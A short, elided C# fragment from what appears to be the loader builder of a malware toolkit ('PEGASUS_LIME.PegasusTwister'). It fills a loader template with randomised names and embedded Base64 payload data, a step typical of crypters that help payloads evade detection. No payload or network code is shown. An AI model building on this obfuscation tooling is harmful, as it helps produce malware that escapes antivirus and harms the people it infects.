...
namespace PEGASUS_LIME.PegasusTwister.Loader
{
	internal class SourceBuilder
	{
		...
		public string Build(Config config)
		{
			...
			loader = loader.Replace(loaderConfig.GetReplacementName("MethodName"), loaderConfig.MethodName);
			loader = loader.Replace(loaderConfig.GetReplacementName("Namespace"), loaderConfig.Namespace);
			loader = loader.Replace(loaderConfig.GetReplacementName("Base64Data"), loaderConfig.Base64Data);
			loader = loader.Replace(loaderConfig.GetReplacementName("Classname"), loaderConfig.Classname);
			loader = loader.Replace(loaderConfig.GetReplacementName("Encoded"), loaderConfig.Encoded);
			loader = loader.Replace(loaderConfig.GetReplacementName("Decoded"), loaderConfig.Decoded);
			return loader.Replace(loaderConfig.GetReplacementName("Instance"), loaderConfig.Instance);
		}
